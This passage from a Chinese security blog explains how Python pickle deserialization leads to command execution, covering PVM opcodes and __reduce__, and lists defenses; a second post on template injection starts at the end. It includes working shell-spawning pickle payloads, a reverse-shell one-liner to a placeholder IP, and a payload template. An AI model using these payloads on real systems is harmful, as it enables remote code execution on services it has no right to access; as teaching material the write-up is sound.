    <link href="/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BPython%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    <url>/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BPython%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h2 id="0X00-前言"><a href="#0X00-前言" class="headerlink" title="0X00 前言"></a><strong>0X00 前言</strong></h2><p>在分析了 PHP 的反序列化漏洞以后我打算将这个反序列化漏洞从语言层面进行扩展，然后我就看中了 python ，网上搜了一下，国内系统的讲 Python 反序列化漏洞的文章比较少，内容也是零零散散，于是我打算自己分析一下 Python 反序列化漏洞造成的命令执行和任意代码执行，然后弥补这个空缺。</p><h2 id="0X01-Python-的序列化和反序列化是什么"><a href="#0X01-Python-的序列化和反序列化是什么" class="headerlink" title="0X01 Python 的序列化和反序列化是什么"></a><strong>0X01 Python 的序列化和反序列化是什么</strong></h2><p>Python 的序列化和反序列化是将一个类对象向字节流转化从而进行存储和传输，然后使用的时候再将字节流转化回原始的对象的一个过程。</p><h3 id="1-用代码展示序列化和反序列化的过程："><a href="#1-用代码展示序列化和反序列化的过程：" class="headerlink" title="1.用代码展示序列化和反序列化的过程："></a><strong>1.用代码展示序列化和反序列化的过程：</strong></h3><p>为了看起来直观一些，我写了一个示例代码：</p><span id="more"></span><h4 id="序列化示例代码："><a href="#序列化示例代码：" class="headerlink" title="序列化示例代码："></a><strong>序列化示例代码：</strong></h4><pre><code class="hljs">import pickleclass People(object):    def __init__(self,name = &quot;K0rz3n&quot;):        self.name = name    def say(self):        print &quot;Hello ! My friends&quot;a=People()c=pickle.dumps(a)print c</code></pre><h4 id="结果："><a href="#结果：" class="headerlink" title="结果："></a><strong>结果：</strong></h4><pre><code class="hljs">ccopy_reg_reconstructorp0(c__main__peoplep1c__builtin__objectp2Ntp3Rp4(dp5S&#39;name&#39;p6S&#39;K0rz3n&#39;p7sb.</code></pre><p>先不要管这些乱七八糟的符号是什么(这是 PVM 虚拟机可以识别的有特殊含义的符号，我在后面会说)，我们先看一下我们认识的，可以清楚地看到 我们对象的属性  name K0rz3n 我们对象所属的类 people 都已近存储在里面了，如果了解过 PHP 反序列化漏洞，你一定知道这和 PHP 的序列化的内容大同小异，因为 PHP 也是将类名和对象的属性序列化进去的。</p><h4 id="反序列化示例代码："><a href="#反序列化示例代码：" class="headerlink" title="反序列化示例代码："></a><strong>反序列化示例代码：</strong></h4><pre><code class="hljs">import pickleclass People(object):    def __init__(self,name = &quot;K0rz3n&quot;):        self.name = name    def say(self):        print &quot;Hello ! My friends&quot;a=People()c=pickle.dumps(a)d = pickle.loads(c)d.say()</code></pre><h4 id="结果：-1"><a href="#结果：-1" class="headerlink" title="结果："></a><strong>结果：</strong></h4><pre><code class="hljs">Hello ! My friends</code></pre><p>可以看到，我们成功通过反序列化的方式恢复了之前我们序列化进去的类对象并成功的执行了对象的方法</p><blockquote><p><strong>注意：</strong></p><p>如果我在反序列化以前删除了 People<br>这个类，那么我们在反序列化的过程中因为对象在当前的运行环境中没有找到这个类就会报错，从而反序列化失败。</p></blockquote><p><strong>示例代码：</strong></p><pre><code class="hljs">import pickleclass People(object):    def __init__(self,name = &quot;K0rz3n&quot;):        self.name = name    def say(self):        print &quot;Hello ! My friends&quot;a=People()c=pickle.dumps(a)del Peopled = pickle.loads(c)</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">AttributeError: &#39;module&#39; object has no attribute &#39;People&#39;</code></pre><h3 id="2-用语言来描述序列化和反序列化的过程："><a href="#2-用语言来描述序列化和反序列化的过程：" class="headerlink" title="2.用语言来描述序列化和反序列化的过程："></a><strong>2.用语言来描述序列化和反序列化的过程：</strong></h3><h4 id="1-序列化过程："><a href="#1-序列化过程：" class="headerlink" title="1.序列化过程："></a><strong>1.序列化过程：</strong></h4><p>(1)从对象提取所有属性,并将属性转化为名值对<br>(2)写入对象的类名<br>(3)写入名值对</p><h4 id="2-反序列化过程："><a href="#2-反序列化过程：" class="headerlink" title="2.反序列化过程："></a><strong>2.反序列化过程：</strong></h4><p>(1)获取 pickle 输入流<br>(2)重建属性列表<br>(3)根据类名创建一个新的对象<br>(4)将属性复制到新的对象中</p><blockquote><p><strong>注意：</strong></p><p>这个对象只要能在当前环境下创建起来就能完成反序列化，否则则不能实现对象的重构</p></blockquote><h2 id="0X02-为什么要实现序列化和反序列化"><a href="#0X02-为什么要实现序列化和反序列化" class="headerlink" title="0X02 为什么要实现序列化和反序列化"></a><strong>0X02 为什么要实现序列化和反序列化</strong></h2><p>和其他语言的序列化一样，Python 的序列化的目的也是为了保存、传递和恢复对象的方便性，在众多传递对象的方式中，序列化和反序列化可以说是最简单和最容易试下的方式</p><h2 id="0X03-python-是怎么实现序列化和反序列化的"><a href="#0X03-python-是怎么实现序列化和反序列化的" class="headerlink" title="0X03 python 是怎么实现序列化和反序列化的"></a><strong>0X03 python 是怎么实现序列化和反序列化的</strong></h2><h3 id="1-几个重要的函数"><a href="#1-几个重要的函数" class="headerlink" title="1.几个重要的函数"></a><strong>1.几个重要的函数</strong></h3><p>Python 为我们提供了两个比较重要的库 pickle 和 cPickle（其中 cpickle 底层使用 c 语言书写，速度是pickle 的 1000 倍，<strong>但是他们的调用接口是一样的，我这里就一 pickle 为例</strong>） 以及几个比较重要的函数来实现序列化和反序列化</p><p><strong>序列化：</strong></p><pre><code class="hljs">pickle.dump(文件) pickle.dumps(字符串)</code></pre><p><strong>反序列化:</strong></p><pre><code class="hljs">pickle.load(文件)pickle.loads(字符串)</code></pre><p>但是底层是怎么实现的呢？这里就不得不提及 PVM(python 虚拟机) 了，它是实现 Python 序列化和反序列化的最根本的东西</p><h3 id="2-PVM-的组成"><a href="#2-PVM-的组成" class="headerlink" title="2.PVM 的组成"></a><strong>2.PVM 的组成</strong></h3><p>PVM 由三个部分组成，引擎（或者叫指令分析器），栈区、还有一个 Memo (这个我也不知道怎么解释，我们姑且叫它 “标签区“)</p><h4 id="1-引擎的作用"><a href="#1-引擎的作用" class="headerlink" title="1.引擎的作用"></a><strong>1.引擎的作用</strong></h4><p>从头开始读取流中的操作码和参数，并对其进行处理,zai在这个过程中改变 栈区 和 标签区，处理结束后到达栈顶，形成并返回反序列化的对象</p><h4 id="2-栈区的作用"><a href="#2-栈区的作用" class="headerlink" title="2.栈区的作用"></a><strong>2.栈区的作用</strong></h4><p>作为流数据处理过程中的暂存区，在不断的进出栈过程中完成对数据流的反序列化，并最终在栈上生成发序列化的结果</p><h4 id="3-标签区的作用"><a href="#3-标签区的作用" class="headerlink" title="3.标签区的作用"></a><strong>3.标签区的作用</strong></h4><p>数据的一个索引或者标记</p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/python%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%961.png" alt="此处输入图片的描述"></p><blockquote><p><strong>注意：PVM 指令的书写规范</strong></p><p>(1)操作码是单字节的<br>(2)带参数的指令用换行符定界</p></blockquote><h3 id="3-PVM-操作码"><a href="#3-PVM-操作码" class="headerlink" title="3.PVM 操作码"></a><strong>3.PVM 操作码</strong></h3><p>为了表达的清楚完整我直接附上截图</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/python%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20PVM%20%E6%93%8D%E4%BD%9C%E7%A0%811.png" alt="此处输入图片的描述"></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/python%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20PVM%20%E6%93%8D%E4%BD%9C%E7%A0%812.png" alt="此处输入图片的描述"></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/python%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20PVM%20%E6%93%8D%E4%BD%9C%E7%A0%813.png" alt="此处输入图片的描述"></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/python%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20PVM%20%E6%93%8D%E4%BD%9C%E7%A0%814.png" alt="此处输入图片的描述"></p><blockquote><p><strong>这里面要重点关注几个</strong></p><p>S : 后面跟的是字符串<br>( ：作为命令执行到哪里的一个标记<br>t ：将从 t 到标记的全部元素组合成一个元祖，然后放入栈中<br>c ：定义模块名和类名（模块名和类名之间使用回车分隔）<br>R ：从栈中取出可调用函数以及元祖形式的参数来执行，并把结果放回栈中<br>. ：点号是结束符**（图中没有，这里补充）**</p></blockquote><h3 id="4-反序列化流程"><a href="#4-反序列化流程" class="headerlink" title="4.反序列化流程"></a><strong>4.反序列化流程</strong></h3><p>序列化就是一个将对象转化成字符串的过程，这个我们能直接使用 pickle 实现，这个过程我们也无需利用和分析，这里不做深究，我这里就是说一下如何进行的反序列化</p><p>我们将下面这个字符串存储为一个文件 shell.pickle</p><pre><code class="hljs">cossystem(S&#39;/bin/sh&#39;tR.</code></pre><p>当我们使用下面这个函数对其进行加载的时候</p><pre><code class="hljs">&gt;&gt;&gt; import pickle&gt;&gt;&gt; pickle.load(open(&#39;shell.pickle&#39;))</code></pre><p><strong>执行结果如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/pickle%20load%20%E7%9A%84%E5%88%B0shell1.png" alt="此处输入图片的描述"></p><p>可以看到成功返回了 sh 的 shell </p><p>我们现在来结合我们上面讲述的 PVM 的操作码看这个文件中的字符串是怎么一步一步执行的</p><p>(1)c 后面是模块名，换行后是类名,于是将 os.system 放入栈中<br>(2)( 这个是标记符，我们将一个 Mark 放入栈中<br>(3)S 后面是字符串，我们放入栈中<br>(4)t 将栈中 Mark 之前的内容取出来转化成元祖，再存入栈中 （’&#x2F;bin&#x2F;sh’,），同时标记 Mark 消失<br>(5)R 将元祖取出，并将 callable 取出，然后将元祖作为 callable 的参数，并执行，对应这里就是 os.system(‘&#x2F;bin&#x2F;sh’),然后将结果再存入栈中</p><blockquote><p><strong>注意：</strong></p><p>其实并不是所有的对象都能使用 pickle 进行序列化和反序列化，比如说 文件对象和网络套接字对象以及代码对象就不可以</p></blockquote><h2 id="0X04-与-PHP-反序列化的对比"><a href="#0X04-与-PHP-反序列化的对比" class="headerlink" title="0X04 与 PHP 反序列化的对比"></a><strong>0X04 与 PHP 反序列化的对比</strong></h2><p>相比于 PHP 反序列化必须要依赖于当前代码中类的存在以及方法的存在，Python 凭借着自己彻底的面向对象的特性完胜 PHP ，Python 除了能反序列化当前代码中出现的类(包括通过 import的方式引入的模块中的类)的对象以外，还能利用其彻底的面向对象的特性来反序列化使用 types 创建的匿名对象（这部分内容在后面会有所介绍），这样的话就大大拓宽了我们的攻击面。</p><h2 id="0X05-Python-反序列化漏洞何来"><a href="#0X05-Python-反序列化漏洞何来" class="headerlink" title="0X05 Python 反序列化漏洞何来"></a><strong>0X05 Python 反序列化漏洞何来</strong></h2><h3 id="1-为什么出现反序列化漏洞"><a href="#1-为什么出现反序列化漏洞" class="headerlink" title="1.为什么出现反序列化漏洞"></a><strong>1.为什么出现反序列化漏洞</strong></h3><p>我们先来看一个 python <a href="https://docs.python.org/2/library/pickle.html">官方文档</a>中的介绍</p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/python%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D1.png" alt="此处输入图片的描述"></p><p>说的意思就是官方并不没有义务保证你传入反序列化函数的内容是安全的，官方只负责反序列化，如果你传入不安全的内容那么自然就是不安全的</p><h3 id="2-反序列化漏洞往往出现在什么地方"><a href="#2-反序列化漏洞往往出现在什么地方" class="headerlink" title="2.反序列化漏洞往往出现在什么地方"></a><strong>2.反序列化漏洞往往出现在什么地方</strong></h3><p>这里引用勾陈安全实验室的大佬<a href="http://www.polaris-lab.com/index.php/archives/178/">写的</a></p><p><strong>1.通常在解析认证token，session的时候</strong></p><p>现在很多web都使用redis、mongodb、memcached等来存储session等状态信息。P神的文章就有一个很好的redis+python反序列化漏洞的很好例子：<a href="https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html%E3%80%82">https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html。</a><br><strong>2.可能将对象Pickle后存储成磁盘文件。</strong><br><strong>3.可能将对象Pickle后在网络中传输。</strong></p><p>其实，最常见的也是最经典的也就是我们的第一点，也就是 flask 配合 redis 在服务端存储 session 的情景，这里的 session 是被 pickle 序列化进行存储的，如果你通过 cookie 进行请求 sessionid 的话，session 中的内容就会被反序列化，看似好像是没有什么问题,因为 session 是存储在 服务端的，但是终究是抵不住 redis 的未授权访问，如果出现未授权的话，我们就能通过 set 设置自己的 session ,然后通过设置 cookie 去请求 session 的过程中我们自定的内容就会被反序列化，然后我们就达到了执行任意命令或者任意代码的目的</p><h3 id="3-我们怎么利用反序列化漏洞"><a href="#3-我们怎么利用反序列化漏洞" class="headerlink" title="3.我们怎么利用反序列化漏洞"></a><strong>3.我们怎么利用反序列化漏洞</strong></h3><h4 id="1-理论基础"><a href="#1-理论基础" class="headerlink" title="1.理论基础"></a><strong>1.理论基础</strong></h4><p>利用的关键点还是如何构造我们的反序列化的 payload，这时候就不得不提到 <code>__reduce__ </code> 这个魔法方法了（<strong>注意：</strong><code>__reduce__</code>方法是新式类(内置类)特有的,）</p><p>关于新式类(内置类)和旧式类(自建类)，我这里简单的说一下，如果想看具体的，请转向 bendawang 师傅的这篇<a href="http://www.bendawang.site/2017/03/21/python%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0-%E4%B8%80-%EF%BC%9A%E7%B1%BB%E4%B8%8E%E5%85%83%E7%B1%BB%EF%BC%88metaclass%EF%BC%89%E7%9A%84%E7%90%86%E8%A7%A3/">博客</a> </p><p>在 python2 中有两种声明类的方式，并且他们实例化的对象性质是不同的</p><p><strong>示例代码：</strong></p><p><strong>旧式类：</strong></p><pre><code class="hljs">&gt;&gt;&gt; class A():...     pass...&gt;&gt;&gt; a = A()&gt;&gt;&gt; type(a)&lt;type &#39;instance&#39;&gt;</code></pre><p><strong>新式类：</strong></p><pre><code class="hljs">&gt;&gt;&gt; class B(object):...     pass...&gt;&gt;&gt; b = B()&gt;&gt;&gt; type(b)&lt;class &#39;__main__.B&#39;&gt;</code></pre><p>但是 Python3 中解决了这个问题，在表现上消除了两者的差别，所以如果在 python2 中我们使用 <code>__reduce__</code> 要使用下面这种声明类的方法</p><p>好了，回到正题，我们先看一下官方是怎么介绍这个 <code>__reduce__</code> 的，</p><blockquote><p>当序列化以及反序列化的过程中中碰到一无所知的扩展类型(<strong>这里指的就是新式类</strong>)的时候，可以通过类中定义的<code>__reduce__</code>方法来告知如何进行序列化或者反序列化</p></blockquote><p>也就是说我们，只要在新式类中定义一个 <code>__reduce__</code> 方法，我们就能在序列化的使用让这个类根据我们在<code>__reduce__</code> 中指定的方式进行序列化，那这就非常好，那我们该如何指定呢？实际上关键就在这个方法的返回值上，这个方法可以返回两种类型的值，String 和 tuple ,我们的构造点就在令其返回 tuple 的时候</p><p>当他返回值是一个元祖的时候，可以提供2到5个参数，我们重点利用的是前两个，第一个参数是一个callable object(可调用的对象)，第二个参数可以是一个元祖为这个可调用对象提供必要的参数，如果你认真看上面的 PVM 的指令码，你就会发现这个返回值和其中的一个 R 指令非常的一致，（我猜测这个 R 指令码就是这个 <code>__reduce__</code> 方法的返回值的底层实现 ）</p><p>这时候耳边传来：<strong>“程序员还是要用代码说话，你说什么人话呢！？”</strong>，好，那我赶紧用代码证明一下我上面啰嗦的废话吧。</p><h4 id="2-实践开始"><a href="#2-实践开始" class="headerlink" title="2.实践开始"></a><strong>2.实践开始</strong></h4><p><strong>实力代码：</strong></p><pre><code class="hljs">import pickleimport osclass A(object):    def __reduce__(self):        a = &#39;/bin/sh&#39;        return (os.system,(a,))a = A()test = pickle.dumps(a)print test</code></pre><p><strong>结果：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/pythpn%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20reduce1%20.png" alt="此处输入图片的描述"></p><p>我们先不要管这里面的 p0 p1 p2 ,我上面说过了，这个东西是一个标签，有了它只是会出现一个存入内存的操作，p 后面的数字是 key ，因此对最后命令的执行没有任何影响</p><p>为了比较方便，我再把上面的那段代码拿下来</p><pre><code class="hljs">cossystem(S&#39;/bin/sh&#39;tR.</code></pre><p>是不是没有任何区别？没错，这再次证明了我的猜测： PVM 的 操作码 R 就是 <code>__reduce__</code> 的返回值的一个底层实现。</p><p>我们让上面这个结果进行反序列化看一下结果</p><p><strong>示例代码：</strong></p><pre><code class="hljs">import pickleimport osclass A(object):    def __reduce__(self):        a = &#39;/bin/sh&#39;        return (os.system,(a,))a = A()test = pickle.dumps(a)pickle.loads(test)</code></pre><p><strong>结果：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/pythpn%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20reduce2%20.png" alt="此处输入图片的描述"></p><p>那这样就非常的方便了，我们能利用这个 reduce 轻松构造我们想要执行的命令，甚至是执行代码（我们可以将 字符串部分换成 python -c “我们要执行的代码”）</p><p><strong>我们尝试执行代码反弹 shell</strong> </p><p><strong>示例代码：</strong></p><pre><code class="hljs">import pickleimport osclass A(object):    def __reduce__(self):        a = &quot;&quot;&quot;python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;xxx.xxx.xxx.xxx&quot;,9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;&quot;&quot;&quot;        return (os.system,(a,))    a=A()result = pickle.dumps(a)pickle.loads(result)</code></pre><p>我在我的 vps 上开 9999 端口进行监听</p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/pythpn%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20reduce3%20.png" alt="此处输入图片的描述"></p><p>我们运行我们的代码，然后成功反弹 shell</p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/pythpn%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20reduce4%20.png" alt="此处输入图片的描述"></p><p><strong>补充：</strong></p><p>又发现了一个比较好的命令能执行 系统命令，那就是  python pty 模块</p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C1.png" alt="此处输入图片的描述"></p><h4 id="3-问题出现"><a href="#3-问题出现" class="headerlink" title="3.问题出现"></a><strong>3.问题出现</strong></h4><p>我们发现如果我们单纯地使用 -c 参数执行代码的话，好像对一些简单的代码还行，但是如果出现了一些自定义函数了，那么在格式上就比较麻烦，那么有没有一种方式可以满足我们真正执行我们想执行的任何代码的目的呢？</p><p>咦？你上面不是说 pickle 不能序列化代码对象吗？ 没错，pickle 的确不可以，不信我们试一试</p><p>由于python可以在函数当中再导入模块和定义函数，所以我们可以将自己要执行的代码都写到一个函数里foo()</p><p><strong>示例代码：</strong></p><pre><code class="hljs">import pickledef foo():    import os    def fib(n):        if n &lt;= 1:            return n        return fib(n-1) + fib(n-2)    print &#39;fib(10) =&#39;, fib(10)    os.system(&#39;/bin/sh&#39;)pickle.dumps(foo.func_code)</code></pre><p><strong>结果:</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C1.png" alt="此处输入图片的描述"></p><h4 id="4-问题解决"><a href="#4-问题解决" class="headerlink" title="4.问题解决"></a><strong>4.问题解决</strong></h4><p>但是，我们还有一个利器，自从 python 2.6 起，Python 给我们提供了一个可以序列化code对象的模块–Marshal</p><p>我们可以这样让这段代码序列化，同时为了显示方便，我们选择序列化后再进行 base64 处理</p><p><strong>示例代码：</strong></p><pre><code class="hljs">import pickleimport marshalimport base64def foo():    import os    def fib(n):        if n &lt;= 1:            return n        return fib(n-1) + fib(n-2)    print &#39;fib(10) =&#39;, fib(10)    os.system(&#39;/bin/sh&#39;)code_serialized = base64.b64encode(marshal.dumps(foo.func_code))print code_serialized</code></pre><p><strong>结果：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C2.png" alt="此处输入图片的描述"></p><p>好，现在我们需要让这段代码在反序列化的时候得到执行，那我们还能不能直接使用 <code>__reduce__</code> 呢？好像不行，因为 reduce 是利用调用某个 callable 并传递参数来执行的，而我们这个函数本身就是一个 callable ，我们需要执行它，而不是将他作为某个函数的参数，那这个时候怎么办？这时候就要利用我们上面分析的那个 PVM 操作码来自己构造了</p><p>我们先写出来我们需要执行的东西，实际上这里也用到了 Python 的一个面向对象的特性，Python 能通过 types.FunctionTyle(func_code,globals(),’’)() 来动态地创建匿名函数，这一部分的内容可以看<a href="https://docs.python.org/3/library/types.html">官方文档</a>的介绍</p><p>结合我们之前的编码操作，我们最重要执行的是</p><pre><code class="hljs">(types.FunctionType(marshal.loads(base64.b64decode(code_enc)), globals(), &#39;&#39;))()</code></pre><p>那我们现在的任务就是如何通过 PVM 操作码来构造出这个东西的执行(其实还是蛮复杂的)</p><p><strong>这里直接给出 payload</strong> </p><pre><code class="hljs">ctypesFunctionType(cmarshalloads(cbase64b64decode(S&#39;YwAAAAABAAAAAgAAAAMAAABzOwAAAGQBAGQAAGwAAH0AAIcAAGYBAGQCAIYAAIkAAGQDAEeIAABkBACDAQBHSHwAAGoBAGQFAIMBAAFkAABTKAYAAABOaf////9jAQAAAAEAAAAEAAAAEwAAAHMsAAAAfAAAZAEAawEAchAAfAAAU4gAAHwAAGQBABiDAQCIAAB8AABkAgAYgwEAF1MoAwAAAE5pAQAAAGkCAAAAKAAAAAAoAQAAAHQBAAAAbigBAAAAdAMAAABmaWIoAAAAAHMHAAAAcGljNC5weVIBAAAABwAAAHMGAAAAAAEMAQQBcwkAAABmaWIoMTApID1pCgAAAHMHAAAAL2Jpbi9zaCgCAAAAdAIAAABvc3QGAAAAc3lzdGVtKAEAAABSAgAAACgAAAAAKAEAAABSAQAAAHMHAAAAcGljNC5weXQDAAAAZm9vBQAAAHMIAAAAAAEMAQ8EDwE=&#39;tRtRc__builtin__globals(tRS&#39;&#39;tR(tR.</code></pre><p> 大家有兴趣可以自己根据我之前的分析来看自己也分析一下这段代码，会对你的能力有所提升，那么为了每次构造这段代码的方便性，外国大牛给出了构造 payload 的模板，</p><p> <strong>payload 模板</strong></p><pre><code class="hljs">import marshalimport base64def foo():    pass # Your code hereprint &quot;&quot;&quot;ctypesFunctionType(cmarshalloads(cbase64b64decode(S&#39;%s&#39;tRtRc__builtin__globals(tRS&#39;&#39;tR(tR.&quot;&quot;&quot; % base64.b64encode(marshal.dumps(foo.func_code))</code></pre><p><strong>结果：</strong></p><p>我们看一下最终执行这段字符串的结果</p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/pickle%20load%20%E7%9A%84%E5%88%B0shell2.png" alt="此处输入图片的描述"></p><p>不仅返回了我们 feibonaqie 数列的结果，还返回了我们的 shell </p><p>上面这部分内容如果想看详细的解释，可以参考 <a href="https://checkoway.net/musings/pickle/">文章一</a> 和 <a href="http://www.polaris-lab.com/index.php/archives/178/">文章二</a></p><h2 id="0X06-Python-反序列化漏洞如何防御"><a href="#0X06-Python-反序列化漏洞如何防御" class="headerlink" title="0X06 Python 反序列化漏洞如何防御"></a><strong>0X06 Python 反序列化漏洞如何防御</strong></h2><p>(1) 不要再不守信任的通道中传递 pcikle 序列化对象<br>(2) 在传递序列化对象前请进行签名或者加密，防止篡改和重播<br>(3) 如果序列化数据存储在磁盘上，请确保不受信任的第三方不能修改、覆盖或者重新创建自己的序列化数据<br>(4) 将 pickle 加载的数据列入白名单</p><h2 id="0X07-参考"><a href="#0X07-参考" class="headerlink" title="0X07 参考"></a><strong>0X07 参考</strong></h2><p><a href="https://checkoway.net/musings/pickle/">https://checkoway.net/musings/pickle/</a><br><a href="http://bendawang.site/2018/03/01/%E5%85%B3%E4%BA%8EPython-sec%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/">http://bendawang.site/2018/03/01/%E5%85%B3%E4%BA%8EPython-sec%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/</a><br><a href="http://www.bendawang.site/2017/03/21/python%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0-%E4%B8%80-%EF%BC%9A%E7%B1%BB%E4%B8%8E%E5%85%83%E7%B1%BB%EF%BC%88metaclass%EF%BC%89%E7%9A%84%E7%90%86%E8%A7%A3/">http://www.bendawang.site/2017/03/21/python%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0-%E4%B8%80-%EF%BC%9A%E7%B1%BB%E4%B8%8E%E5%85%83%E7%B1%BB%EF%BC%88metaclass%EF%BC%89%E7%9A%84%E7%90%86%E8%A7%A3/</a><br><a href="http://www.polaris-lab.com/index.php/archives/178/">http://www.polaris-lab.com/index.php/archives/178/</a><br><a href="https://xz.aliyun.com/t/2289">https://xz.aliyun.com/t/2289</a><br><a href="https://blog.csdn.net/yanghuan313/article/details/65010925">https://blog.csdn.net/yanghuan313/article/details/65010925</a><br><a href="https://www.cnblogs.com/wfzWebSecuity/p/9401677.html">https://www.cnblogs.com/wfzWebSecuity/p/9401677.html</a><br><a href="http://blog.knownsec.com/2015/12/sqlmap-code-execution-vulnerability-analysis/">http://blog.knownsec.com/2015/12/sqlmap-code-execution-vulnerability-analysis/</a><br><a href="https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf">https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf</a><br><a href="https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_WP.pdf">https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_WP.pdf</a><br><a href="https://blog.csdn.net/sinat_29552923/article/details/70833455">https://blog.csdn.net/sinat_29552923/article/details/70833455</a><br><a href="https://blog.nelhage.com/2011/03/exploiting-pickle/">https://blog.nelhage.com/2011/03/exploiting-pickle/</a><br><a href="https://segmentfault.com/a/1190000013099825">https://segmentfault.com/a/1190000013099825</a><br><a href="https://segmentfault.com/a/1190000013214956">https://segmentfault.com/a/1190000013214956</a></p>]]></content>
    
    
    <categories>
      
      <category>漏洞分析</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web安全 漏洞分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>一篇文章带你理解漏洞之 SSTI 漏洞</title>
    <link href="/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E/"/>
    <url>/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h2 id="0X00-前言："><a href="#0X00-前言：" class="headerlink" title="0X00 前言："></a><strong>0X00 前言：</strong></h2><p>这是“一篇文章带你理解漏洞”系列的第一篇文章，漏洞没有特定的介绍顺序，写作的目的主要是希望能将整个漏洞的框架完整的搭建起来（框架也就是所谓的前因后果-&gt;纵向，类比迁移-&gt;横向，探寻方法-&gt;技巧），而不是对漏洞的某一方面的简单陈述，我认为在没有完整的漏洞框架的基础上去单纯地学习怎么利用这种漏洞是没有意义的。</p><h2 id="0X01-什么是注入："><a href="#0X01-什么是注入：" class="headerlink" title="0X01 什么是注入："></a><strong>0X01 什么是注入：</strong></h2><p>看之前先记住一句话：<strong>注入就是格式化字符串漏洞的一种体现</strong></p><p>我们都知道，在01 的世界里，很多的漏洞都能归结为格式化字符串漏洞（不管是二进制还是web），二进制中我们能通过格式化字符串漏洞覆盖返回地址等，web中 SQL 注入就是一个非常好的例子，我们在开发者本来认为我们应该插入正常数据的地方插入了sql语句，这就破坏了原本的SQL 语句的格式，从而执行了与原句完全不同含义的SQL 语句达到了攻击者的目的，同理 XSS 在有些情况下的闭合标签的手法也是利用了格式化字符串这种思想，总之，凡是出现注入的地方就有着格式化字符串的影子。</p><span id="more"></span><h2 id="0X02-什么是模板注入："><a href="#0X02-什么是模板注入：" class="headerlink" title="0X02 什么是模板注入："></a><strong>0X02 什么是模板注入：</strong></h2><p>SSTI （服务器端模板注入）也是格式化字符串的一个非常好的例子，如今的开发已经形成了非常成熟的 MVC 的模式，我们的输入通过 V 接收，交给 C ，然后由 C 